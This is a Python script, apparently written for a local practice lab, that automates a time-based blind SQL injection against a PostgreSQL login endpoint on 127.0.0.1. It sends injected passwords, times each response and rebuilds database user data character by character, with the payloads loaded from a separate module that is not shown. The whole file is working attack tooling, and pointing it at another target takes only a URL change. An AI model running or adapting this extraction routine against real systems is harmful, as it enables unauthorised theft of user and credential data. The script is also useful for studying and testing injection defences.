from yaspin import yaspin
import time
import requests
import string
import signal
from termcolor import colored
import dic_inyecciones_time as dic

# controlar CTRL+C
def signal_handler(sig, frame):
    print('\nYou pressed Ctrl+C!')
    exit(0)


signal.signal(signal.SIGINT, signal_handler)


def llamada_api(inyeccion):
    data = {
        "username": 'user1',
        "password": inyeccion
    }

    response = requests.post("http://127.0.0.1:5000/login/postgres/time_based", json=data)

    return response


def menu_inyecciones():
    print(colored("[+] Elige una inyección introduciendo su número:", "red"))
    lista_inyecciones = list(dic.diccionario_inyecciones.keys())
    while True:
        for i, iny in enumerate(lista_inyecciones):
            print(colored(f"{i + 1}", "magenta") + f":{iny.title()}")

        inyeccion = input("Inyección: ")
        try:
            if int(inyeccion) - 1 < len(lista_inyecciones):
                return dic.diccionario_inyecciones[lista_inyecciones[int(inyeccion) - 1]]
            else:
                raise Exception
        except Exception:
            print(colored("[!] Introduce un número válido", "red"))


def main():
    # Configurar el total de pasos
    total_steps = 100

    # Inicializar la palabra a adivinar
    palabra = ""

    # Menu de inyecciones
    inyeccion = menu_inyecciones()

    # Crear un spinner con el texto inicial
    with yaspin(text="Extrayendo usuarios de la BD: ", color="red") as spinner:

        # Obtener todas las letras (mayúsculas y minúsculas) y dígitos
        conjunto_car = list(string.ascii_letters + string.digits)

        # Añadir ',' al principio de la lista
        conjunto_car.insert(0, ",")
        conjunto_car.insert(0, ":")
        for i in range(total_steps + 1):

            for letra in conjunto_car:
                tiempo_inicial = time.time()

                nueva_inyeccion = dic.transformar_inyeccion(inyeccion, palabra + letra, len(palabra) + 1)
                llamada_api(nueva_inyeccion)

                tiempo_final = time.time()
                tiempo_total = tiempo_final - tiempo_inicial

                spinner.text = f"Extrayendo usuarios de la BD: {palabra + letra}"
                if tiempo_total > 1:
                    palabra += letra
                    break
                if letra == conjunto_car[-1]:
                    spinner.color = "green"
                    spinner.text = "Completado"
                    spinner.ok("✓")
                    print(f"\nRESULTADO: {palabra}")
                    exit(0)

            # Actualizar el texto del spinner
            spinner.text = f"Extrayendo usuarios de la BD: {palabra + letra}"

        # Cambiar el mensaje al finalizar
        spinner.text = "Completado"
        spinner.ok("✔")


if __name__ == "__main__":
    main()
